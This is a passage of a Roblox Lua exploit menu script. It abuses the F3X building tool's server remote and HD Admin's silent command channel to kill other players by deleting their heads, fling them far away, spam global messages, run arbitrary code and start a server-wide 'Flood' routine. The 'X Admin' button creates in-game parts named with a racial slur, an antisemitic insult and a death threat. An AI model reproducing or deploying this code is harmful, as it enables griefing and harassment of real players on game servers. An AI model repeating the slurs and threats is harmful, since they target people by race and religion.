		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
			RequestCommandSilent:InvokeServer(";hp I [1] [Nex Pluvia] Nex Pluvia.")
	
			RequestCommandSilent:InvokeServer(";talk me Nex Pluvia Installed")
	
	
	
	
	
	
		end)
	
		local button = Instance.new("TextButton")
		button.Parent = acg
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Empty"
		button.Position = UDim2.new(0.5,3,0,66)
		button.Size = UDim2.new(0.5,-3,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Empty"
		button.TextColor3 = whit
		button.MouseButton1Down:connect(function()
	
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = acg
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Kill Gui"
		button.Position = UDim2.new(0,0,0,99)
		button.Size = UDim2.new(0.5,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Kill Gui"
		button.TextColor3 = whit
		button.MouseButton1Down:connect(function()
			local player = game.Players.LocalPlayer
			local gui = Instance.new("ScreenGui")
			gui.Parent = player.PlayerGui
			gui.Name = "Kill"
	
			local pos = 135
			local pos2 = 10
			local pos3 = 0
			local enabled = false
	
			local tool
			for i, v in player:GetDescendants() do
				if v.Name == "SyncAPI" then
					tool = v.Parent
				end
			end
			for i, v in game.ReplicatedStorage:GetDescendants() do
				if v.Name == "SyncAPI" then
					tool = v.Parent
				end
			end
	
			local remote = tool.SyncAPI.ServerEndpoint
			function _(args)
				remote:InvokeServer(unpack(args))
			end
	
			function DestroyPart(part)
				local args = {
					[1] = "Remove",
					[2] = {
						[1] = part
					}
				}
				_(args)
			end
	
			local button = Instance.new("TextButton")
			button.Parent = gui
			button.Size = UDim2.new(0, 100, 0, 30)
			button.Position = UDim2.new(0, 8, 0, pos)
			button.Text = "Kill"
	
			button.MouseButton1Click:Connect(function()
				if not enabled then
					enabled = true
					local players = game.Players:GetChildren()
					local red = 0
					local green = 0.5
					local blue = 0
	
					for i = 1, #players do
						wait()
						pos2 = pos2 + 23
						if pos2 >= 450 then
							pos3 = pos3 + 103
							pos2 = 33
						end
	
						if green <= 0.9 then
							green = green + 0.46
						else
							green = green - 0.46
						end
	
						local bu = Instance.new("TextButton")
						bu.Parent = button
						bu.Size = UDim2.new(0, 100, 0, 20)
						bu.Position = UDim2.new(0, pos3, 0, pos2)
						bu.Text = players[i].Name
						bu.BackgroundTransparency = 1
						bu.TextTransparency = 1
						bu.BackgroundColor3 = Color3.new(red, green, blue)
	
						coroutine.resume(coroutine.create(function()
							for i = 1, 3 do
								wait()
								bu.BackgroundTransparency = bu.BackgroundTransparency - 0.34
								bu.TextTransparency = bu.BackgroundTransparency
							end
						end))
	
						bu.MouseButton1Down:Connect(function()
							local target = game.Players:FindFirstChild(bu.Text)
							if target and target.Character and target.Character:FindFirstChild("Head") then
								DestroyPart(target.Character.Head)
								bu.Text = "Killed!"
								wait(2)
								bu.Text = target.Name
							end
						end)
					end
				else
					enabled = false
					pos2 = 10
					pos3 = 0
				end
			end)
	
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = acg
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Silent Executor"
		button.Position = UDim2.new(0.5,3,0,99)
		button.Size = UDim2.new(0.5,-3,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Silent Executor"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
			openkey = "y"
	
			closing=false
			function doclose() if not closing and not opening then closing=true
					if exe.Rotation == 0 then
						for i=0,-360,-20 do
							exe.Rotation=i wait()
						end
						exe.Rotation = 0
						for i=1,20 do
							exe.Position = exe.Position + UDim2.new(-0.1,0,0,0) wait()
						end
						exe.Visible=false show.Visible=true
						exe.Position = UDim2.new(0.5, -291, 0.5, -157)
						for _,mpops in pairs(CodeExecutorLocal.Parent:GetChildren()) do
							if mpops:IsA("ScreenGui") and mpops.Name == "MessagePopup" then
								mpops:Destroy()
							end
						end wait()
					end
					closing=false end
			end
	
			opening=false
			function doopen() if not opening and not closing then opening=true
					exe.Visible = true
					show.Visible=false
					for i=0,360,20 do
						exe.Rotation = i wait()
					end
					exe.Rotation = 0
					if not viewed then viewed=true wait(3)
						for i=1,55 do
							V3Logo.Position = V3Logo.Position + UDim2.new(0,0,-0.02,0) wait()
						end
						V3Logo:Destroy()
					end
				end
				opening=false
			end
			function guimsg(header,message,duration,daddy)
				MessagePopup = Instance.new("ScreenGui", daddy)
				MessagePopup.Name = "MessagePopup"
	
				bg = Instance.new("Frame", MessagePopup)
				bg.Name = "bg"
				bg.Position = UDim2.new(0.5, -200, 0.20000000298023, 0)
				bg.Size = UDim2.new(0, 400, 0, 140)
				bg.BackgroundColor3 = Color3.new(0, 0, 0)
				bg.BorderSizePixel = 0
				bg.Style = Enum.FrameStyle.RobloxRound
				bg.ZIndex = 9
	
				title = Instance.new("TextBox", bg)
				title.Name = "title"
				title.Size = UDim2.new(1, 0, 0, 50)
				title.BackgroundColor3 = Color3.new(0.66666668653488, 0, 0)
				title.BackgroundTransparency = 1
				title.BorderSizePixel = 0
				title.Text = header
				title.Font = Enum.Font.SourceSansBold
				title.FontSize = Enum.FontSize.Size48
				title.TextScaled = true
				title.TextWrapped = true
				title.TextColor3 = Color3.new(0.66666668653488, 0, 0)
				title.ZIndex = 10
	
				desc = Instance.new("TextBox", bg)
				desc.Name = "desc"
				desc.Position = UDim2.new(0, 0, 0, 60)
				desc.Size = UDim2.new(1, 0, 0, 50)
				desc.BackgroundColor3 = Color3.new(0.66666668653488, 0, 0)
				desc.BackgroundTransparency = 1
				desc.BorderSizePixel = 0
				desc.Text = message
				desc.Font = Enum.Font.SourceSansBold
				desc.FontSize = Enum.FontSize.Size36
				desc.TextScaled = true
				desc.TextWrapped = true
				desc.TextColor3 = Color3.new(1, 1, 1)
				desc.ZIndex = 10
				wait(duration) MessagePopup:Destroy()
			end
			function lodecode(daddy)
				CodeExecutorLocal = Instance.new("ScreenGui", daddy)
				CodeExecutorLocal.Name = "CodeExecutorLocal"
	
				exe = Instance.new("Frame", CodeExecutorLocal)
				exe.Name = "exe"
				exe.Position = UDim2.new(0.5, -291, 0.5, -157)
				exe.Size = UDim2.new(0, 600, 0, 300)
				exe.BackgroundColor3 = Color3.new(0, 1, 0)
				exe.BackgroundTransparency = 0.5
				exe.BorderSizePixel = 0
				exe.Visible = false
				exe.Active = true
				exe.ZIndex = 7
				exe.Draggable = true
	
				run = Instance.new("TextButton", exe)
				run.Name = "run"
				run.Position = UDim2.new(0, 0, 1, -30)
				run.Size = UDim2.new(0, 140, 0, 30)
				run.BackgroundColor3 = Color3.new(1, 1, 1)
				run.BorderSizePixel = 0
				run.Text = "Execute"
				run.Font = Enum.Font.ArialBold
				run.FontSize = Enum.FontSize.Size24
				run.TextColor3 = Color3.new(0, 1, 0)
				run.ZIndex = 10
	
				clear = Instance.new("TextButton", exe)
				clear.Name = "clear"
				clear.Position = UDim2.new(0, 460, 1, -30)
				clear.Size = UDim2.new(0, 140, 0, 30)
				clear.BackgroundColor3 = Color3.new(1, 1, 1)
				clear.BorderSizePixel = 0
				clear.Text = "Clear"
				clear.Font = Enum.Font.ArialBold
				clear.FontSize = Enum.FontSize.Size24
				clear.TextWrapped = true
				clear.TextColor3 = Color3.new(1, 0, 0)
				clear.ZIndex = 10
	
				code = Instance.new("TextBox", exe)
				code.Name = "code"
				code.Size = UDim2.new(1, 0, 0.89999997615814, 0)
				code.BackgroundColor3 = Color3.new(0, 0, 0)
				code.BorderSizePixel = 0
				code.Text = "--Remake by skyl0rd still fucking sucks yeah"
				code.FontSize = Enum.FontSize.Size11
				code.TextWrapped = true
				code.TextXAlignment = Enum.TextXAlignment.Left
				code.TextYAlignment = Enum.TextYAlignment.Top
				code.TextColor3 = Color3.new(0, 1, 0)
				code.ClearTextOnFocus = false
				code.ZIndex = 8
	
				hide = Instance.new("TextButton", exe)
				hide.Name = "hide"
				hide.Position = UDim2.new(0.5, -70, 1, -30)
				hide.Size = UDim2.new(0, 140, 0, 30)
				hide.BackgroundColor3 = Color3.new(1, 1, 1)
				hide.BorderSizePixel = 0
				hide.Text = "Hide"
				hide.Font = Enum.Font.ArialBold
				hide.FontSize = Enum.FontSize.Size24
				hide.TextColor3 = Color3.new(0, 0, 0)
				hide.ZIndex = 10
	
				V3Logo = Instance.new("ImageLabel", exe)
				V3Logo.Name = "V3Logo"
				V3Logo.Position = UDim2.new(0.10000000149012, 0, 0.20000000298023, 0)
				V3Logo.Size = UDim2.new(0.80000001192093, 0, 0.30000001192093, 0)
				V3Logo.BackgroundColor3 = Color3.new(1, 1, 1)
				V3Logo.Image = "rbxassetid://127743025"
				V3Logo.ZIndex = 10
				V3Logo.BackgroundTransparency = 1
				V3Logo.BorderSizePixel = 0
	
				show = Instance.new("TextButton", CodeExecutorLocal)
				show.Name = "show"
				show.Position = UDim2.new(-0.0099999997764826, 0, 1, -30)
				show.Size = UDim2.new(0, 140, 0, 30)
				show.BackgroundColor3 = Color3.new(1, 1, 1)
				show.BorderSizePixel = 0
				show.Text = "Show "
				show.Font = Enum.Font.ArialBold
				show.FontSize = Enum.FontSize.Size24
				show.TextXAlignment = Enum.TextXAlignment.Right
				show.TextColor3 = Color3.new(0, 1, 0)
				show.ZIndex = 10
	
				append = Instance.new("TextButton", exe)
				append.Name = "append"
				append.Position = UDim2.new(0.5, -70, 1, 0)
				append.Size = UDim2.new(0, 140, 0, 30)
				append.BackgroundColor3 = Color3.new(1, 1, 1)
				append.BorderColor3 = Color3.new(0.10588235408068, 0.16470588743687, 0.20784313976765)
				append.Text = "Append Code"
				append.Font = Enum.Font.ArialBold
				append.FontSize = Enum.FontSize.Size24
				append.TextColor3 = Color3.new(0, 0, 0)
				append.ZIndex = 10
	
				nl = Instance.new("TextButton", exe)
				nl.Name = "nl"
				nl.Position = UDim2.new(0.5, -70, 1, 30)
				nl.Size = UDim2.new(0, 140, 0, 30)
				nl.BackgroundColor3 = Color3.new(1, 1, 1)
				nl.Text = "New Line"
				nl.Font = Enum.Font.ArialBold
				nl.FontSize = Enum.FontSize.Size24
				nl.TextColor3 = Color3.new(0, 0, 0)
				nl.ZIndex = 10
	
			end
	
			if pcall(function()lodecode(game.CoreGui) end) then hascore=true else
				pcall(function()lodecode(game.Players.LocalPlayer.PlayerGui) end) hascore=false
			end
			wait()
			savecode = Instance.new("StringValue") savecode.Parent = exe savecode.Name="AppendedCode" savecode.Value=""
	
			appe=false
			append.MouseButton1Down:connect(function() if not appe then appe=true
					savecode.Value = savecode.Value..code.Text wait() append.Text = "Appended" code.Text="" wait(3) append.Text = "Append Code" appe=false end
			end)
	
			nl.MouseButton1Down:connect(function() code.Text = code.Text.."\n" end)
	
			local cl = true viewed=false
			show.MouseButton1Down:connect(function() if cl then cl=false
					doopen()
					cl=true end
			end)
	
			hide.MouseEnter:connect(function()
				hide.BackgroundColor3 = Color3.new(1,0,0)
			end)
			hide.MouseLeave:connect(function()
				hide.BackgroundColor3 = Color3.new(1,1,1)
			end)
			run.MouseEnter:connect(function()
				run.BackgroundColor3 = Color3.new(0,1,0)
				run.TextColor3 = Color3.new(1,1,1)
			end)
			run.MouseLeave:connect(function()
				run.BackgroundColor3 = Color3.new(1,1,1)
				run.TextColor3 = Color3.new(0,1,0)
			end)
			clear.MouseEnter:connect(function()
				clear.BackgroundColor3 = Color3.new(1,0,0)
				clear.TextColor3 = Color3.new(1,1,1)
			end)
			clear.MouseLeave:connect(function()
				clear.BackgroundColor3 = Color3.new(1,1,1)
				clear.TextColor3 = Color3.new(1,0,0)
			end)
			clear.MouseButton1Down:connect(function()
				code.Text = "" savecode.Value=""
			end)
			show.MouseEnter:connect(function()
				show.BackgroundColor3 = Color3.new(0,1,0)
				show.TextColor3 = Color3.new(1,1,1)
			end)
			show.MouseLeave:connect(function()
				show.BackgroundColor3 = Color3.new(1,1,1)
				show.TextColor3 = Color3.new(0,1,0)
			end)
	
			cl2=true
			hide.MouseButton1Down:connect(function() if cl2 then cl2=false
					doclose()
					cl2=true end
			end)
	
			function keycheck(keyy)
				if type(keyy)=="string" and string.byte(string.lower(keyy)) then
					return string.lower(keyy)
				else return false end
			end
	
	
			game.Players.LocalPlayer:GetMouse().KeyDown:connect(function(key)
				if not opening and not closing then if keycheck(key)==openkey then running=true
						if exe.Visible then doclose()
						else doopen() end
					end end
			end)
	
			local function GetError(not_errored, codee)
				if not_errored then
					codee = "Executing Code..."
				end
				for _,mpops in pairs(CodeExecutorLocal.Parent:GetChildren()) do
					if mpops:IsA("ScreenGui") and mpops.Name == "MessagePopup" then
						mpops:Destroy()
					end
				end wait()
				if not_errored and code.Text:match("%S+") and savecode.Value:match("%S") then
					guimsg('Vermillion: ',codee,3,CodeExecutorLocal.Parent)
				elseif not code.Text:match("%S+") and not savecode.Value:match("%S+") then
					guimsg('Error:',"Did not enter code.",3,CodeExecutorLocal.Parent)
				else
					guimsg('Executed:',codee,3,CodeExecutorLocal.Parent)
				end
			end
	
			deb = true
			run.MouseButton1Down:connect(function()
				if deb then deb=false
					coroutine.resume(coroutine.create(function(codee)
						local errored,output = ypcall(loadstring(savecode.Value..code.Text))
						GetError(errored,output)
						errored,output = nil
					end),codee)
					wait(1)
					deb=true end
			end)
	
		end)
	
		--
		local button = Instance.new("TextButton")
		button.Parent = acg
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Nilizer"
		button.Position = UDim2.new(0,0,0,132)
		button.Size = UDim2.new(0.5,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Nilizer"
		button.TextColor3 = whit
		button.MouseButton1Down:connect(function()
			local Players = game:GetService("Players")
			local RunService = game:GetService("RunService")
	
			local player = Players.LocalPlayer
			local char = player.Character or player.CharacterAdded:Wait()
			local hrp = char:WaitForChild("HumanoidRootPart")
	
			-- หา SyncAPI
			local tool
			for _,v in ipairs(player:GetDescendants()) do
				if v.Name == "SyncAPI" then tool = v.Parent end
			end
			for _,v in ipairs(game.ReplicatedStorage:GetDescendants()) do
				if v.Name == "SyncAPI" then tool = v.Parent end
			end
			if not tool then return warn("ไม่พบ SyncAPI") end
	
			local remote = tool.SyncAPI.ServerEndpoint
			local function _(args)
				remote:InvokeServer(unpack(args))
			end
	
			-- ฟังก์ชัน SyncAPI
			function SetCollision(part,boolean)
				_( {"SyncCollision",{ {Part=part,CanCollide=boolean} } } )
			end
			function SetAnchor(boolean,part)
				_( {"SyncAnchor",{ {Part=part,Anchored=boolean} } } )
			end
			function CreatePart(cf,parent)
				_( {"CreatePart","Normal",cf,parent} )
			end
			function MovePart(part,cf)
				_( {"SyncMove",{ {Part=part,CFrame=cf} } } )
			end
			function AddMesh(part)
				_( {"CreateMeshes",{ {Part=part} } } )
			end
			function SetMesh(part,meshid)
				_( {"SyncMesh",{ {Part=part, MeshId="rbxassetid://"..meshid} } } )
			end
			function MeshResize(part,size)
				_( {"SyncMesh",{ {Part=part, Scale=size} } } )
			end
			function SetName(part,stringg)
				_( {"SetName",{part},stringg} )
			end
			function Color(part,color)
				_( {"SyncColor",{ {Part=part,Color=color,UnionColoring=false} } } )
			end
	
			-- ฟังก์ชันรอ Part
			local function waitForPart(pos)
				local part
				for i=1,50 do
					for _,v in ipairs(workspace:GetDescendants()) do
						if v:IsA("BasePart") and (v.Position - pos).Magnitude < 1 then
							part = v
							return part
						end
					end
					task.wait(0.05)
				end
				return part
			end
	
			-- สร้าง Mesh รอบผู้เล่น ขนาด 2x2x2
			local function createOrbitMesh()
				local radius = 5
				local speed = math.rad(70)
				local angle = 0
	
				local cf = hrp.CFrame * CFrame.new(radius,0,0)
				CreatePart(cf, workspace)
				task.wait(0.2)
	
				local meshPart = waitForPart(cf.Position)
				if not meshPart then return warn("ไม่พบ Part") end
	
				SetName(meshPart,"OrbitMesh")
				SetAnchor(true, meshPart)
				SetCollision(meshPart,false)
				AddMesh(meshPart)
				SetMesh(meshPart,"73293113466593")
				MeshResize(meshPart, Vector3.new(2,2,2)) -- ขนาด 2x2x2
				Color(meshPart, Color3.fromRGB(0,255,0))
	
				RunService.Heartbeat:Connect(function(dt)
					angle = angle + dt*speed
					local x = math.cos(angle)*radius
					local z = math.sin(angle)*radius
					local pos = hrp.Position + Vector3.new(x,0,z)
					local cfNew = CFrame.new(pos) * CFrame.Angles(0, angle, 0)
					MovePart(meshPart, cfNew)
				end)
			end
	
			createOrbitMesh()
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = acg
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Remso Admin"
		button.Position = UDim2.new(0.5,3,0,132)
		button.Size = UDim2.new(0.5,-3,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Remso Admin"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
	
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = acg
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "X Admin"
		button.Position = UDim2.new(0,0,0,165)
		button.Size = UDim2.new(0.499,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "X Admin"
		button.TextColor3 = whit
		button.MouseButton1Down:connect(function()
			local Players = game:GetService("Players")
			local RunService = game:GetService("RunService")
			local player = Players.LocalPlayer
			local char = player.Character or player.CharacterAdded:Wait()
			local root = char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("Torso")
			if not root then return end
	
			-- หา SyncAPI
			local tool
			for _,v in ipairs(player:GetDescendants()) do
				if v.Name == "SyncAPI" then tool = v.Parent end
			end
			if not tool or not tool:FindFirstChild("SyncAPI") then return end
	
			local remote = tool.SyncAPI.ServerEndpoint
			local function _(args) remote:InvokeServer(unpack(args)) end
	
			-- ฟังก์ชัน SyncAPI
			local function CreatePart(cf, parent) return remote:InvokeServer("CreatePart", "Normal", cf, parent) end
			local function Resize(part, size, cf) _( {"SyncResize",{ {Part=part, Size=size, CFrame=cf} } } ) end
			local function SetAnchor(bool, part) _( {"SyncAnchor",{ {Part=part, Anchored=bool} } } ) end
			local function SetCollision(part, bool) _( {"SyncCollision",{ {Part=part, CanCollide=bool} } } ) end
			local function SetName(part, name) _( {"SetName",{part},name} ) end
			local function Color(part, color3) _( {"SyncColor",{ {Part=part, Color=color3, UnionColoring=false} } } ) end
			local function SetTrans(part, trans) _( {"SyncMaterial",{ {Part=part, Transparency=trans} } } ) end
			local function AddTexture(part, id, face) _( {"AddDecal",{Part=part, Texture=id, Face=face}} ) end
	
			-- ข้อมูล Part
			local size = Vector3.new(0.2,6,5)
			local transparency = 0.5
			local color = Color3.fromRGB(255,0,0) -- แดง
			local textureId = "rbxassetid://753015087"
	
			local frontRotation = CFrame.Angles(math.rad(2), math.rad(99), math.rad(-25))
			local backRotation  = CFrame.Angles(math.rad(2), math.rad(99), math.rad(25))
	
			-- สร้าง Part
			local frontPart = CreatePart(root.CFrame, workspace)
			Resize(frontPart, size, root.CFrame)
			Color(frontPart, color)
			SetTrans(frontPart, transparency)
			SetName(frontPart, "FUCK U NIGGER -SKYL0RD")
			SetCollision(frontPart,false)
			SetAnchor(true, frontPart)
			AddTexture(frontPart, textureId, Enum.NormalId.Left)
			AddTexture(frontPart, textureId, Enum.NormalId.Right)
	
			local backPart = CreatePart(root.CFrame, workspace)
			Resize(backPart, size, root.CFrame)
			Color(backPart, color)
			SetTrans(backPart, transparency)
			SetName(backPart, "I HOPE U FUCKING DIE JEWISH RETARD HOLY FUCK I HATE U I WILL KILL U OMG I CANT.. FUCK UUUUUUUU")
			SetCollision(backPart,false)
			SetAnchor(true, backPart)
			AddTexture(backPart, textureId, Enum.NormalId.Left)
			AddTexture(backPart, textureId, Enum.NormalId.Right)
	
			-- ขยับตามตัวผู้เล่น + หมุนเล็กน้อย
			RunService.RenderStepped:Connect(function()
				local rootCFrame = root.CFrame
	
				local frontCF = rootCFrame * CFrame.new(0,2,-9) * frontRotation
				local backCF  = rootCFrame * CFrame.new(0,2,9)  * backRotation
	
				-- ปรับขนาดและตำแหน่ง
				Resize(frontPart, size, frontCF)
				Resize(backPart, size, backCF)
	
				-- เปลี่ยนสีไดนามิก (ตัวอย่าง: สีแดงสลับฟ้า)
				local t = tick()%2
				if t < 1 then
					Color(frontPart, Color3.fromRGB(255,0,0))
					Color(backPart, Color3.fromRGB(0,0,255))
				else
					Color(frontPart, Color3.fromRGB(0,255,0))
					Color(backPart, Color3.fromRGB(255,255,0))
				end
			end)
	
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = acg
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Lag Gui"
		button.Position = UDim2.new(0.5,3,0,165)
		button.Size = UDim2.new(0.5,-3,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = Enum.FontSize.Size14
		button.Text = "Lag Gui"
		button.TextColor3 = whit
	
		button.MouseButton1Down:Connect(function()
			local Players = game:GetService("Players")
			local LocalPlayer = Players.LocalPlayer
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
	
			-- GUI หลัก
			local gui = Instance.new("ScreenGui")
			gui.Name = "Lag"
			gui.ResetOnSpawn = false
			gui.Parent = LocalPlayer:WaitForChild("PlayerGui")
	
			local mainButton = Instance.new("TextButton")
			mainButton.Parent = gui
			mainButton.Size = UDim2.new(0, 100, 0, 30)
			mainButton.Position = UDim2.new(0, 8, 0, 135)
			mainButton.Text = "Lag"
			mainButton.BackgroundColor3 = Color3.fromRGB(40,40,40)
			mainButton.TextColor3 = Color3.new(1,1,1)
	
			local frame = Instance.new("Frame")
			frame.Parent = gui
			frame.BackgroundTransparency = 0.3
			frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
			frame.Position = UDim2.new(0, 8, 0, 170)
			frame.Size = UDim2.new(0, 250, 0, 300)
			frame.Visible = false
	
			local posY = 10
			local posX = 0
			local enabled = false
	
			-- หา SyncAPI
			local syncTool
			for _, v in ipairs(LocalPlayer:GetDescendants()) do
				if v.Name == "SyncAPI" then
					syncTool = v.Parent
					break
				end
			end
			if not syncTool then
				warn("ไม่พบ SyncAPI")
				return
			end
	
			-- ฟังก์ชันวาป
			local function glitchWarp(targetPlayer)
				if not targetPlayer.Character then return end
	
				local originalPositions = {}
				for _, part in ipairs(targetPlayer.Character:GetDescendants()) do
					if part:IsA("BasePart") then
						originalPositions[part] = part.CFrame
					end
				end
	
				local function warpAll(cframeOffset)
					local args = {
						[1] = "SyncMove",
						[2] = {}
					}
					for part, origCFrame in pairs(originalPositions) do
						table.insert(args[2], {
							["Part"] = part,
							["CFrame"] = origCFrame * cframeOffset
						})
					end
					syncTool.SyncAPI.ServerEndpoint:InvokeServer(args[1], args[2])
				end
	
				local targetOffset = CFrame.new(0, 999999, 0)
	
				for i = 1, 5 do
					warpAll(targetOffset)
					task.wait(0.05)
					warpAll(CFrame.new())
					task.wait(0.05)
				end
			end
	
			mainButton.MouseButton1Click:Connect(function()
				if not enabled then
					enabled = true
					frame.Visible = true
	
					for _, child in ipairs(frame:GetChildren()) do
						if child:IsA("TextButton") then
							child:Destroy()
						end
					end
	
					for i, p in ipairs(Players:GetPlayers()) do
						if p ~= LocalPlayer then
							posY = posY + 25
							if posY >= 270 then
								posX = posX + 105
								posY = 30
							end
	
							local bu = Instance.new("TextButton")
							bu.Parent = frame
							bu.Size = UDim2.new(0, 100, 0, 20)
							bu.Position = UDim2.new(0, posX + 10, 0, posY)
							bu.Text = p.Name
							bu.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
							bu.TextColor3 = Color3.new(1, 1, 1)
	
							bu.MouseButton1Click:Connect(function()
								glitchWarp(p)
								bu.Text = "Warped!"
								task.wait(1)
								bu.Text = p.Name
							end)
						end
					end
				else
					enabled = false
					frame.Visible = false
				end
			end)
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = acg
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Global Message Gui"
		button.Position = UDim2.new(0,0,0,198)
		button.Size = UDim2.new(0.499,0,0,30)
		button.ZIndex = 3
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Global Message Gui"
		button.TextColor3 = whit
		button.TextWrapped = true
		button.MouseButton1Down:connect(function()
			gui = Instance.new("ScreenGui",game.Players.LocalPlayer.PlayerGui)
			box = Instance.new("TextBox",gui)
			box.Size = UDim2.new(0,100,0,100)
			msg = Instance.new("TextButton",gui)
			msg.Size = UDim2.new(0,100,0,50)
			msg.Position = UDim2.new(.5,0,0,0)
			msg.MouseButton1Click:connect(function()
				for _,v in pairs(game.Players:GetChildren()) do
					local ReplicatedStorage = game:GetService("ReplicatedStorage")
					local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
					RequestCommandSilent:InvokeServer(";talk all " .. box.text)
					RequestCommandSilent:InvokeServer(";talk all " .. box.text)
					RequestCommandSilent:InvokeServer(";talk all " .. box.text)
				end
			end)
		end)
		--
		local button = Instance.new("TextButton")
		button.Parent = acg
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Empty"
		button.Position = UDim2.new(0.5,3,0,198)
		button.Size = UDim2.new(0.5,-3,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Empty"
		button.TextColor3 = whit
		button.MouseButton1Down:connect(function()
	
		end)
		-- Server Destruction --
		local button = Instance.new("TextButton")
		button.Parent = sd
		button.BackgroundColor3 = blak
		button.BorderColor3 = rede
		button.BorderSizePixel = 3
		button.Name = "Flood"
		button.Position = UDim2.new(0,0,0,33)
		button.Size = UDim2.new(0.5,0,0,30)
		button.ZIndex = 2
		button.Font = tef
		button.FontSize = "Size14"
		button.Text = "Flood"
		button.TextColor3 = whit
		button.MouseButton1Down:connect(function()
			local player = game.Players.LocalPlayer
			local char = player.Character
			local backpack = player.Backpack
			local function getf3x()
				for _, v in ipairs(backpack:GetChildren()) do
					if v:FindFirstChild("SyncAPI") then
						return v
					end
				end
				for _, v in ipairs(char:GetChildren()) do
					if v:FindFirstChild("SyncAPI") then
						return v
					end
				end
				return nil
			end
	
			local f3x = getf3x()
			if not f3x then
				warn("you dont have f3x skid")
			end
			local syncapi = f3x.SyncAPI
			local serverendpoint = syncapi.ServerEndpoint
	
			function _(args)
				serverendpoint:InvokeServer(unpack(args))
			end
	
			local function addlight(part, brightness)
				local args = {
					[1] = "CreateLights",
					[2] = {
						[1] = {
							["Part"] = part,
							["LightType"] = "PointLight"
						}
					}
				}
				serverendpoint:InvokeServer(unpack(args))
			end
	
			local function synclight(part, brightness)
				local args = {
					[1] = "SyncLighting",
					[2] = {
						[1] = {
							["Part"] = part,
							["LightType"] = "PointLight",
							["Range"] = 22,
							["Color"] = Color3.new(1, 0, 0)
						}
					}
				}
				serverendpoint:InvokeServer(unpack(args))
			end
	
			local function fire(part) 
	
				local argsCreate = {
					[1] = "CreateDecorations",
					[2] = {
						[1] = {
							["Part"] = part,
							["DecorationType"] = "Fire"
						}
					}
				}
	
	
				local argsSync = {
					[1] = "SyncDecorate",
					[2] = {
						[1] = {
							["Part"] = part,
							["DecorationType"] = "Fire",
							["Size"] = 30,
							["Heat"] = 9,
							["Color"] = Color3.fromRGB(255, 0, 0), 
							["SecondaryColor"] = Color3.fromRGB(255, 0, 0) 
						} 
					} 
				}
	
	
				_(argsCreate)
				_(argsSync)
			end
			function MovePart(part, cf)
				local args = {
					"SyncMove",
					{
						{
							Part = part,
							CFrame = cf
						}
					}
				}
				_(args)
			end
	
			local function resize(part, size, cf)
				local args = {
					"SyncResize",
					{
						{
							Part = part,
							CFrame = cf,
							Size = size
						}
					}
				}
				_(args)
			end
	
			function SetTrans(part,int)
				local args = {
					[1] = "SyncMaterial",
					[2] = {
						[1] = {
							["Part"] = part,
							["Transparency"] = int
						}
					}
				}
				_(args)
			end
	
			local function mat(part, mate)
				local args = {
					"SyncMaterial",
					{
						{
							Part = part,
							Material = mate
						}
					}
				}
				_(args)
			end
	
			local function transparency(part, trans)
				local args = {
					"SyncMaterial",
					{
						{
							Part = part,
							Transparency = trans
						}
					}
				}
				_(args)
			end
	
			local function color(part, color)
				local args = {
					"SyncColor",
					{
						{
							Part = part,
							Color = color,
							UnionColoring = false
						}
					}
				}
				_(args)
			end
	
			local function syncmeshid(part, id)
				local args = {
					"SyncMesh",
					{
						{
							Part = part,
							MeshId = "rbxassetid://" .. id
						}
					}
				}
				_(args)
			end
	
			local function makemesh(part)
				local args = {
					"CreateMeshes",
					{
						{
							Part = part
						}
					}
				}
				_(args)
			end
	
			local function syncmeshsize(part, vectora)
				local args = {
					"SyncMesh",
					{
						{
							Part = part,
							Scale = vectora
						}
					}
				}
				_(args)
			end
	
			local function syncmeshtexture(part, id)
				local args = {
					"SyncMesh",
					{
						{
							Part = part,
							TextureId = "rbxassetid://" .. id
						}
					}
				}
				_(args)
			end
	
			local function name(part, stringa)
				local args = {
					"SetName",
					{ part },
					stringa
				}
				_(args)
			end
	
			local function lock(part, boolean)
				local args = {
					"SetLocked",
					{ part },
					boolean
